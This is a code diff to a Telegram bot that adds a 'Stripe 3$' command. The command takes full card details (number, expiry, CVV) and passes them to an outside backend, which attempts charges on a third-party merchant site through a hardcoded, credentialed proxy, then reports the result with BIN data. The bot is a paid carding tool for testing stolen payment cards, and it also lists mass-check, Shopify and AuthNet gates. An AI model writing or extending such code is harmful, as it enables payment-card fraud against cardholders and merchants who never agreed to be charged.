@@ -664,6 +664,9 @@ async def charge_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_
         ],
         [
             InlineKeyboardButton("💳 Stripe 1$", callback_data="stripe_gate"),
+            InlineKeyboardButton("💳 Stripe 3$", callback_data="stripe3_gate"),  # ✅ Added new button
+        ],
+        [
             InlineKeyboardButton("💵 Shopify 10$", callback_data="shopify10_gate")
         ],
         [
@@ -686,6 +689,7 @@ async def charge_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_
             reply_markup=keyboard,
             disable_web_page_preview=True
         )
+
 
 
 async def shopify_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -872,6 +876,42 @@ async def stripe_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
             disable_web_page_preview=True
         )
 
+
+async def stripe3_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Callback handler for the 'Stripe 3$' button."""
+    q = update.callback_query
+    await q.answer()
+    text = (
+        "✦━━━━━━━━━━━━━━✦\n"
+        "      💳 <b>Stripe 3$</b>\n"
+        "✦━━━━━━━━━━━━━━✦\n\n"
+        "• <code>/st1</code> - <i>Check a single card on Stripe $3</i>\n"
+        "  Example:\n"
+        "  <code>/st1 1234567890123456|12|2026|123</code>\n\n"
+        "⚡ Each check deducts credits.\n\n"
+        "✨ <b>Status</b> - <i>Active</i> ✅"
+    )
+    keyboard = [
+        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu")],
+        [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")]
+    ]
+    try:
+        # Correctly use edit_message_caption
+        await q.edit_message_caption(
+            caption=text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+    except Exception as e:
+        logger.warning(f"Failed to edit message, sending a new one: {e}")
+        await q.message.reply_text(
+            text=text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            disable_web_page_preview=True
+        )
+
+
 async def ds_lookup_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Callback handler for the '3DS Lookup' button."""
     q = update.callback_query
@@ -924,8 +964,9 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "shopify_gate": shopify_gate_handler,
         "autoshopify_gate": autoshopify_gate_handler,
         "stripe_gate": stripe_gate_handler,
-        "shopify10_gate": shopify10_gate_handler,   # NEW
-        "authnet36_gate": authnet36_gate_handler,   # NEW
+        "stripe3_gate": stripe3_gate_handler,          # ✅ Added Stripe 3$
+        "shopify10_gate": shopify10_gate_handler,
+        "authnet36_gate": authnet36_gate_handler,
         "stripe_examples": stripe_examples_handler,
         "braintree_examples": braintree_examples_handler,
         "ds_lookup": ds_lookup_menu_handler,
@@ -962,6 +1003,7 @@ async def cmds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🔹 <b>𝙎𝙩𝙧𝙞𝙥𝙚</b>\n"
         f"{bullet_link} <code>/chk cc|mm|yy|cvv</code> – Single Stripe Auth\n"
         f"{bullet_link} <code>/st cc|mm|yy|cvv</code> – Stripe 1$\n"
+        f"{bullet_link} <code>/st1 cc|mm|yy|cvv</code> – Stripe 3$\n"
         f"{bullet_link} <code>/mst cc|mm|yy|cvv</code> – Mass x30 Stripe 1$\n"
         f"{bullet_link} <code>/mass</code> – Mass x30 Stripe Auth 2\n\n"
 
@@ -3104,11 +3146,11 @@ import re
 logger = logging.getLogger(__name__)
 
 # --- HC Processor ---
-async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
+async def process_st1(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
     """
-    Process a /at command: check AuthNet card, display response and BIN info.
+    Process a /st1 command: check Stripe charge, display response and BIN info.
+    Gateway label = Stripe, Price = 3$
     """
-
     try:
         user = update.effective_user
 
@@ -3121,7 +3163,7 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         parts = payload.split("|")
         if len(parts) != 4:
             await update.message.reply_text(
-                "❌ Invalid format.\nUse: `/at 1234567812345678|12|2028|123`",
+                "❌ Invalid format.\nUse: `/st1 1234567812345678|12|2028|123`",
                 parse_mode=ParseMode.MARKDOWN_V2
             )
             return
@@ -3137,7 +3179,7 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         processing_text = (
             f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
             f"<pre><code>{full_card}</code></pre>\n\n"
-            f"{bullet_link} <b>Gateway ➵ 𝐀𝐮𝐭𝐡𝐍𝐞𝐭 𝐂𝐡𝐚𝐫𝐠𝐞</b>\n"
+            f"{bullet_link} <b>Gateway ➵ 𝐒𝐭𝐫𝐢𝐩𝐞 𝟑$</b>\n"
             f"{bullet_link} <b>Status ➵ Checking 🔎...</b>"
         )
 
@@ -3148,10 +3190,12 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         )
 
         # --- API request ---
+        # NOTE: adjust this endpoint/params if your backend expects different query keys for Stripe.
         api_url = (
             f"https://auto-shopify-6cz4.onrender.com/index.php"
             f"?site=https://unikeyhealth.com"
             f"&cc={full_card}"
+            f"&gateway=stripe"
             f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
         )
 
@@ -3171,8 +3215,8 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
             return
 
         response = data.get("Response", "Unknown")
-        gateway = data.get("Gateway", "AuthNet")
-        price = data.get("Price", "2.95$")
+        gateway = data.get("Gateway", "Stripe")
+        price = data.get("Price", "3$")  # default to 3$
 
         # --- BIN lookup ---
         try:
@@ -3208,9 +3252,9 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         # --- Final formatted message ---
         final_msg = (
-            f"◇━━〔 <b>𝑨𝒖𝒕𝒉𝑵𝒆𝒕</b> 〕━━◇\n"
+            f"◇━━〔 <b>𝑺𝒕𝒓𝒊𝒑𝒆</b> 〕━━◇\n"
             f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{full_card}</code>\n"
-            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑨𝒖𝒕𝒉𝑵𝒆𝒕 𝟐.𝟗𝟓$\n"
+            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝐒𝐭𝐫𝐢𝐩𝐞 𝟑$\n"
             f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{display_response}</i>\n"
             "――――――――――――――――\n"
             f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➵ <code>{escape(brand)}</code>\n"
@@ -3229,7 +3273,7 @@ async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         )
 
     except Exception as e:
-        logger.exception("Error in processing /at")
+        logger.exception("Error in processing /st1")
         try:
             await update.message.reply_text(
                 f"❌ Error: <code>{escape(str(e))}</code>",
@@ -3246,7 +3290,7 @@ import re
 # Assuming you have this regex pattern somewhere globally:
 CARD_REGEX = re.compile(r"\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4}")
 
-async def at_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def st1_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
 
     # --- Cooldown check ---
@@ -3268,14 +3312,14 @@ async def at_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # --- If still no payload ---
     if not payload:
         await update.message.reply_text(
-            "⚠️ Usage: <code>/at card|mm|yy|cvv</code>\n"
+            "⚠️ Usage: <code>/st1 card|mm|yy|cvv</code>\n"
             "Or reply to a message containing a card.",
             parse_mode=ParseMode.HTML
         )
         return
 
     # --- Run in background ---
-    asyncio.create_task(process_at(update, context, payload))
+    asyncio.create_task(process_st1(update, context, payload))
 
 
 
@@ -6430,6 +6474,7 @@ def register_commands(application):
         ("credits", credits_command),
         ("chk", chk_command),
         ("st", st),
+        ("st1", st1_command),
         ("mst", mst_command),
         ("mass", mass_handler),
         ("sh", sh_command),
